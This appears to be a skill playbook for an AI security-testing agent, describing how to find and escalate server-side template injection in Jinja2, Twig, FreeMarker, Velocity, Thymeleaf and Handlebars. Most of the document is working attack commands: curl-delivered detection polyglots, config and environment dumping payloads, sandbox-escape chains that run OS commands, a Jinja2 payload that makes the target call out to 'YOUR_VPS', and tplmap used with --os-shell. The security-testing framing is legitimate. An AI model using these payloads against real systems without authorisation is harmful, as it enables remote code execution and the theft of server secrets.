---
name: hunt-ssti
description: >
  Hunt for Server-Side Template Injection across Jinja2, Twig, FreeMarker, Velocity, and
  others, using detection polyglots to fingerprint the engine before escalating. Use when
  user input is rendered through a server-side templating engine — email templates, PDF/
  report generation, "customize your message" features, CMS page builders, error page
  customization.
  Keywords: ssti, server-side template injection, jinja2, twig, freemarker, velocity,
  thymeleaf, handlebars, template engine, polyglot payload, sandbox escape, {{7*7}}.
  Do NOT use for client-side template injection (Angular/Vue sandbox escape rendered only in
  the browser) — that is a hunt-xss variant (CSTI). Do NOT use once you've already reached OS
  command execution — continue the escalation under hunt-rce.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-1336, CWE-94]
  mitre_attack: [T1190]
  tools: [curl, tplmap, burp, ffuf]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, rce]
chains_with: [rce, info-disclosure, lfi-rfi]
---

## Signals

- Features that generate dynamic text from user input: "email template preview," "custom
  report title," PDF generation with user-supplied headers/footers, CMS "custom HTML widget"
  blocks, error-page customization, chatbot/notification message templates.
- Input reflected with arithmetic apparently evaluated, or with template-engine-specific
  artifacts leaking in error messages (`TemplateSyntaxError`, `UndefinedError`, Twig's
  `Twig\Error\SyntaxError`, FreeMarker's `freemarker.core.ParseException`).
- Backend fingerprints suggesting a templating stack: Flask/Django (Jinja2), Symfony/Drupal
  (Twig), Java Spring/Struts (FreeMarker, Velocity, Thymeleaf), Node (Handlebars, EJS, Pug).
- Fields that accept markup/variables syntax hints in their own documentation (e.g., "use
  {{user.name}} to personalize your email").

## Prerequisites

- An injection point rendered server-side through a templating engine (not just displayed
  verbatim — confirm arithmetic evaluation first, step 1, before anything engine-specific).
- Ideally, a fingerprint of the backend language/framework (from headers, error pages, static
  asset paths like `/static/`, `.jsp`, `.php`) to shortcut which polyglot segment fired.

## Methodology

1. **Polyglot detection probe** — send a single payload that disambiguates across the major
   engines at once, based on which arithmetic result appears in the response:
   ```text
   ${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}
   ```
   ```bash
   curl -s --data-urlencode "name=\${7*7}{{7*7}}<%= 7*7 %>\${{7*7}}#{7*7}" \
     "https://target/preview"
   ```
   Interpretation of which substring evaluates to `49`:
   | Result shows 49 for | Engine |
   |---|---|
   | `{{7*7}}` | Jinja2, Twig |
   | `${7*7}` | FreeMarker, Velocity (also plain shell/EL in some contexts) |
   | `${{7*7}}` | some Twig sandboxed configs, Pebble |
   | `#{7*7}` | Ruby ERB ((`#{}`) / some Thymeleaf SpEL contexts) |
   | `<%= 7*7 %>` | ERB/EJS |

2. **Confirm with engine-specific syntax** once the polyglot narrows it down (always test a
   non-evaluating control too, e.g. `{{7*'7'}}` in Jinja2 produces `7777777` not `49` — different
   engines distinguish string vs. numeric multiply, useful for fingerprinting Jinja2 vs Twig
   specifically):
   ```bash
   # Jinja2 (Python/Flask)
   curl -s --data-urlencode "name={{7*'7'}}" "https://target/preview"   # -> 7777777 in Jinja2

   # Twig (PHP/Symfony)
   curl -s --data-urlencode "name={{7*'7'}}" "https://target/preview"   # -> 49 in Twig (type juggling)

   # FreeMarker (Java)
   curl -s --data-urlencode "name=<#assign x=7*7>\${x}" "https://target/preview"

   # Velocity (Java)
   curl -s --data-urlencode 'name=#set($x=7*7)$x' "https://target/preview"

   # Handlebars (Node) — generally sandboxed against expression eval, test helper abuse instead
   curl -s --data-urlencode 'name={{#with "constructor"}}{{lookup ../this "constructor"}}{{/with}}' \
     "https://target/preview"

   # Thymeleaf (Java/Spring) — SpEL injection via preprocessing syntax
   curl -s --data-urlencode 'name=__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x' \
     "https://target/preview"
   ```

3. **Escalate to information disclosure** (config/env access) before jumping to RCE — lower-risk
   proof that's still a strong finding:
   ```bash
   # Jinja2 — dump config
   curl -s --data-urlencode "name={{config.items()}}" "https://target/preview"
   curl -s --data-urlencode "name={{self.__init__.__globals__}}" "https://target/preview"

   # Twig
   curl -s --data-urlencode "name={{_self.env.getRuntimeLoaders()}}" "https://target/preview"
   ```

4. **Escalate to RCE via sandbox-escape payloads** (only after confirming the engine; coordinate
   with hunt-rce for the OOB listener confirmation):
   ```bash
   # Jinja2 — classic sandbox escape via __globals__ / __subclasses__ chain
   curl -s --data-urlencode \
     "name={{ cycler.__init__.__globals__.os.popen('curl http://YOUR_VPS/ssti-confirm').read() }}" \
     "https://target/preview"
   curl -s --data-urlencode \
     "name={{ ''.__class__.__mro__[1].__subclasses__() }}" "https://target/preview"
   # (then pick the os/subprocess-adjacent class index from the output and build the exec chain)

   # Twig — sandbox-escape via filter abuse (version-dependent)
   curl -s --data-urlencode \
     'name={{["id"]|filter("system")}}' "https://target/preview"

   # FreeMarker — direct Execute model
   curl -s --data-urlencode \
     'name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' \
     "https://target/preview"

   # Velocity — Runtime exec via reflection
   curl -s --data-urlencode \
     '#set($e="exp")#set($rt=$e.class.forName("java.lang.Runtime"))
      #set($proc=$rt.getRuntime().exec("id"))' "https://target/preview"
   ```
   Confirm via OOB callback or direct command-output reflection, same discipline as hunt-rce.

5. **Automate fingerprinting/exploitation with tplmap** once a manual signal exists:
   ```bash
   python3 tplmap.py -u "https://target/preview?name=test*"
   python3 tplmap.py -u "https://target/preview" --data="name=test*" --os-shell
   ```

## Tooling

- `tplmap` — automated SSTI detection and OS-shell escalation across many engines.
- `curl` — the core manual polyglot/engine-specific probing tool.
- Burp Suite — Intruder with a payload list of engine-specific polyglots across all candidate
  params.
- Your OOB listener from hunt-ssrf/hunt-rce for blind RCE confirmation once an engine is
  confirmed.

## Root Causes

- User input concatenated directly into a template *string* before rendering (`render_template_
  string(user_input)` in Flask, `Twig::createTemplate(user_input)`), rather than passed as a
  *variable* into a fixed, pre-written template.
- Sandboxed template environments with known/incomplete sandbox-escape gadgets (common historical
  issue in Jinja2 `SandboxedEnvironment`, older Twig sandbox extension versions).
- "Mail merge"/personalization features exposing the full templating language to end users
  instead of a restricted variable-substitution-only syntax.

## Validation Gate (minimum proof)

- Arithmetic evaluation confirmed (`49` returned for a `7*7` payload) with the specific syntax
  that fired, pinning down the exact engine.
- For RCE escalation: OOB callback received or command output reflected, same bar as hunt-rce.
- Document the exact payload, engine, and version (if determinable from error messages) —
  SSTI findings are engine/version-specific and the writeup should let a developer reproduce
  precisely.

## Gotchas

- **Minimum proof, not full RCE every time.** Confirmed template-expression evaluation (step 1-2)
  without a working sandbox-escape chain is still a real, reportable SSTI finding (label severity
  per the demonstrated level — arithmetic eval vs. full RCE are very different CVSS scores). Don't
  silently drop an engine-confirmed-but-not-RCE'd finding.
- **Common N/A:** input is HTML-escaped *before* reaching the template (common when a templating
  engine's auto-escape is on for the output but the payload still gets rendered as literal text)
  — verify the arithmetic actually evaluates, not just that your `{{ }}` syntax survives
  unescaped in the HTML.
- **Common N/A:** some frameworks pre-compile templates at build time and only interpolate
  *data* into named placeholders (e.g., Handlebars `{{name}}` with no raw-HTML triple-stash and
  no custom helper abuse) — true SSTI requires the user input to become part of the *template
  source*, not just a bound variable; confirm which case you're in before claiming SSTI
  (a bound-variable-only case is XSS territory at most, not SSTI).
- **Overclaim trap:** `7*7` evaluating in a URL or math-widget feature that is *supposed* to
  do math (a calculator app) is not a vulnerability — confirm the context is a templating engine
  applied to otherwise-static content, not a feature whose entire purpose is expression
  evaluation.
- Sandbox-escape payload chains are Python/library-version-sensitive (the `__subclasses__()`
  index for a usable `os`-adjacent class shifts between versions) — always enumerate the actual
  subclasses list from the target rather than hardcoding an index from a write-up.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **File read** — Can you read files from the server via the template engine's file-access primitives?
2. **Full RCE** — Can you escalate from template expression evaluation to full OS command execution, not just an arithmetic/string proof?
3. **Cross-engine portability** — Which template engine is it, and does the payload work across engines (Jinja2, Twig, Freemarker, Velocity) or is it engine-specific?
4. **Stored vs reflected** — Is the injection in a user-visible stored field (profile, comment) or only a reflected, one-shot context? Stored SSTI raises severity.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- SSTI → **rce** (direct escalation path — see hunt-rce's SSTI-to-RCE step).
- SSTI → **info-disclosure** (config/env/secret dumping via template introspection, even without
  full RCE).
- SSTI → **lfi-rfi** when the template engine's built-in `include`/`import` directives can be
  abused to read arbitrary files (e.g., Twig's `{{ include() }}` with a path traversal payload).
